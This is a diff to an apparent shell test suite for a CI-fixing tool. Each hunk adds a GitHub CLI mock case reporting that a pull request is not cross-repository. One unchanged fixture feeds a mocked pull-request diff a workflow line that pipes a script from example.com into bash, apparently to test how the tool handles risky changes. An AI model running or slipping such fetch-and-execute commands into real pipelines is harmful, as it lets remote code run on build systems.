@@ -47,6 +47,7 @@ teardown() {
 case "$*" in
   *"issues/"*"/comments"*)
     echo '[{"body":"<!-- dev-lead-fix-ci sha=abc123def456 status=applied -->\nfix applied"}]' ;;
+  *"pr view"*"isCrossRepository"*) echo '{"isCrossRepository":false}' ;;
   *) echo "{}" ;;
 esac
 GHEOF
@@ -69,6 +70,7 @@ case "$ARGS" in
     echo "[]" ;;
   *"pr comment"*)
     exit 0 ;;
+  *"pr view"*"isCrossRepository"*) echo '{"isCrossRepository":false}' ;;
   *) echo "{}" ;;
 esac
 GHEOF
@@ -98,6 +100,7 @@ case "$ARGS" in
     echo "[]" ;;
   *"pr comment"*)
     exit 0 ;;
+  *"pr view"*"isCrossRepository"*) echo '{"isCrossRepository":false}' ;;
   *) echo "{}" ;;
 esac
 GHEOF
@@ -121,6 +124,7 @@ case "$ARGS" in
   *"issues/"*"/comments"*) echo "[]" ;;
   *"pr comment"*) exit 0 ;;
   *"run view"*) echo "log output" ;;
+  *"pr view"*"isCrossRepository"*) echo '{"isCrossRepository":false}' ;;
   *) echo "{}" ;;
 esac
 GHEOF
@@ -145,6 +149,7 @@ case "$ARGS" in
   *"issues/"*"/comments"*) echo "[]" ;;
   *"pr comment"*) exit 0 ;;
   *"run view"*) echo "log output" ;;
+  *"pr view"*"isCrossRepository"*) echo '{"isCrossRepository":false}' ;;
   *) echo "{}" ;;
 esac
 GHEOF
@@ -177,6 +182,7 @@ case "$ARGS" in
   *"issues/"*"/comments"*) echo "[]" ;;
   *"pr comment"*) exit 0 ;;
   *"run view"*) echo "log output" ;;
+  *"pr view"*"isCrossRepository"*) echo '{"isCrossRepository":false}' ;;
   *) echo "{}" ;;
 esac
 GHEOF
@@ -197,6 +203,7 @@ case "$ARGS" in
   *"issues/"*"/comments"*) echo "[]" ;;
   *"pr comment"*) exit 0 ;;
   *"run view"*) echo "log output" ;;
+  *"pr view"*"isCrossRepository"*) echo '{"isCrossRepository":false}' ;;
   *) echo "{}" ;;
 esac
 GHEOF
@@ -223,6 +230,7 @@ case "$*" in
   *"pr checkout"*) exit 0 ;;
   *"pr comment"*) echo "comment posted"; exit 0 ;;
   *"run view"*) echo "log output" ;;
+  *"pr view"*"isCrossRepository"*) echo '{"isCrossRepository":false}' ;;
   *) echo "{}" ;;
 esac
 GHEOF
@@ -246,6 +254,7 @@ case "$*" in
     {"body":"<!-- dev-lead-fix-ci pr=42 status=exhausted -->\nexhausted"},
     {"body":"<!-- dev-lead-fix-ci sha=old111 status=failed -->\nfailed"}
   ]' ;;
+  *"pr view"*"isCrossRepository"*) echo '{"isCrossRepository":false}' ;;
   *) echo "{}" ;;
 esac
 GHEOF
@@ -267,6 +276,7 @@ case "$*" in
   *"pr checkout"*) exit 0 ;;
   *"pr comment"*) echo "sha-comment posted"; exit 0 ;;
   *"run view"*) echo "log output" ;;
+  *"pr view"*"isCrossRepository"*) echo '{"isCrossRepository":false}' ;;
   *) echo "{}" ;;
 esac
 GHEOF
@@ -311,6 +321,7 @@ case "$*" in
   *"pr comment"*) echo "COMMENT_POSTED: $*"; exit 0 ;;
   *"run view"*) echo "log output" ;;
   *"copilot"*) echo "rate limit exceeded"; exit 1 ;;
+  *"pr view"*"isCrossRepository"*) echo '{"isCrossRepository":false}' ;;
   *) echo "{}" ;;
 esac
 GHEOF
@@ -338,6 +349,7 @@ case "$*" in
   *"pr comment"*) echo "COMMENT_POSTED"; exit 0 ;;
   *"run view"*) echo "log output" ;;
   *"copilot"*) echo "rate limit exceeded"; exit 1 ;;
+  *"pr view"*"isCrossRepository"*) echo '{"isCrossRepository":false}' ;;
   *) echo "{}" ;;
 esac
 GHEOF
@@ -376,6 +388,7 @@ case "$*" in
   *"pr checkout"*) exit 0 ;;
   *"pr comment"*) exit 0 ;;
   *"run view"*) echo "log output" ;;
+  *"pr view"*"isCrossRepository"*) echo '{"isCrossRepository":false}' ;;
   *) echo "{}" ;;
 esac
 GHEOF
@@ -398,6 +411,7 @@ case "$*" in
   *"issues/42/comments"*) echo '[
     {"body":"<!-- dev-lead-fix-ci sha=abc123def456 status=applied -->\napplied"}
   ]' ;;
+  *"pr view"*"isCrossRepository"*) echo '{"isCrossRepository":false}' ;;
   *) echo "{}" ;;
 esac
 GHEOF
@@ -423,6 +437,7 @@ case "$*" in
   *"pr comment"*) echo "COMMENT_POSTED"; exit 0 ;;
   *"run view"*) echo "log output" ;;
   *"copilot"*) echo "rate limit exceeded"; exit 1 ;;
+  *"pr view"*"isCrossRepository"*) echo '{"isCrossRepository":false}' ;;
   *) echo "{}" ;;
 esac
 GHEOF
@@ -456,6 +471,7 @@ case "$ARGS" in
   *"issues/"*"/comments"*) echo "[]" ;;
   *"pr comment"*) exit 0 ;;
   *"pr diff"*) printf 'diff --git a/lint.yml b/lint.yml\n+run: curl -sL https://example.com/install.sh | bash\n' ;;
+  *"pr view"*"isCrossRepository"*) echo '{"isCrossRepository":false}' ;;
   *) echo "{}" ;;
 esac
 GHEOF
@@ -487,6 +503,7 @@ case "\$ARGS" in
   *"pr comment"*) exit 0 ;;
   *"run view"*) touch "${sentinel_dir}/.ran_run_view"; echo "github-actions log output" ;;
   *"pr diff"*) touch "${sentinel_dir}/.ran_pr_diff"; echo "diff output" ;;
+  *"pr view"*"isCrossRepository"*) echo '{"isCrossRepository":false}' ;;
   *) echo "{}" ;;
 esac
 GHEOF
